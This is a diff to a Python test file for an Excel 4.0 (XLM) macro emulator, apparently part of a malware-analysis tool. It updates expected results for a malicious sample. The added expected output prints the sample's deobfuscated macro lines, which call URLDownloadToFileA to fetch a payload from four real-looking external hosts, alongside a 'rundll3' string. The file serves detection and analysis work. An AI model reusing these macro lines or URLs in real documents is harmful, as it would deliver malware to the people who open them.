@@ -53,7 +53,7 @@ class TestEmulator(TestBase):
             ('rpn', XLM_MACRO_RPN_BIFF8, 'mP9mScF1m5', 10, 20, XlmStatus.End),
             ('names', XLM_MACRO_NAMES_BIFF8, 'Acf444', 9591, 1, XlmStatus.PartialEvaluation),
             ('assign', XLM_MACRO_ASSIGN_BIFF8, 'sod', 25282, 148, XlmStatus.End),
-            ('text', XLM_MACRO_TEXT_XLSM, 'Doc1', 121, 52, XlmStatus.FullEvaluation),
+            ('text', XLM_MACRO_TEXT_XLSM, 'Doc1', 121, 52, XlmStatus.PartialEvaluation),
             ('formula', XLM_MACRO_FORMULA_XLSM, 'PCWV', 34, 7, XlmStatus.FullEvaluation),
             ('maldoc', self.download_sample(_MALDOC), 'Tiposa1', 30, 7, XlmStatus.FullEvaluation),
         ]:
@@ -69,7 +69,7 @@ class TestEmulator(TestBase):
             ('rpn', XLM_MACRO_RPN_BIFF8, ['End', 'FullEvaluation', 'PartialEvaluation']),
             ('names', XLM_MACRO_NAMES_BIFF8, ['PartialEvaluation']),
             ('assign', XLM_MACRO_ASSIGN_BIFF8, ['End', 'FullEvaluation', 'PartialEvaluation']),
-            ('text', XLM_MACRO_TEXT_XLSM, ['FullEvaluation', 'PartialEvaluation']),
+            ('text', XLM_MACRO_TEXT_XLSM, ['End', 'FullEvaluation', 'PartialEvaluation']),
             ('formula', XLM_MACRO_FORMULA_XLSM, ['FullEvaluation', 'PartialEvaluation']),
             ('maldoc', self.download_sample(_MALDOC), ['FullEvaluation', 'PartialEvaluation']),
         ]:
@@ -85,7 +85,7 @@ class TestEmulator(TestBase):
             ('rpn', XLM_MACRO_RPN_BIFF8, [20, 19, 8, 3]),
             ('names', XLM_MACRO_NAMES_BIFF8, [1, 1, 0, 0]),
             ('assign', XLM_MACRO_ASSIGN_BIFF8, [135, 81, 6, 4]),
-            ('text', XLM_MACRO_TEXT_XLSM, [10, 4, 0, 0]),
+            ('text', XLM_MACRO_TEXT_XLSM, [22, 9, 5, 4]),
             ('formula', XLM_MACRO_FORMULA_XLSM, [11, 10, 8, 7]),
             ('maldoc', self.download_sample(_MALDOC), [27, 6, 1, 1]),
         ]:
@@ -105,6 +105,11 @@ class TestEmulator(TestBase):
                 ('Doc1', 110, 52),
                 ('Doc1', 118, 52),
                 ('Doc1', 120, 52),
+                ('Doc1', 93, 56),
+                ('Doc1', 95, 56),
+                ('Doc1', 97, 56),
+                ('Doc1', 99, 56),
+                ('Doc1', 114, 62),
             ],
         )
         self.assertEqual(
@@ -114,6 +119,15 @@ class TestEmulator(TestBase):
                 'SET.VALUE(BD109,"URLDownloadToFile")',
                 'SET.VALUE(BD119,"JJCCBB")',
                 'SET.VALUE(Doc1!BD121,"rundll3")',
+                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
+                '"https://maharaniworld.com/ds/3103.gif","..\\iekdhfe.dsk1",0,0)',
+                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
+                '"https://aycconsultoriaempresarial.com/ds/3103.gif","..\\iekdhfe.dsk2",0,0)',
+                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
+                '"https://sgb.ac.ke/ds/3103.gif","..\\iekdhfe.dsk3",0,0)',
+                'CALL("URLMon","URLDownloadToFileA","JJCCBB",0,'
+                '"https://hashmati.com/ds/3103.gif","..\\iekdhfe.dsk4",0,0)',
+                'HALT()',
             ],
         )
 
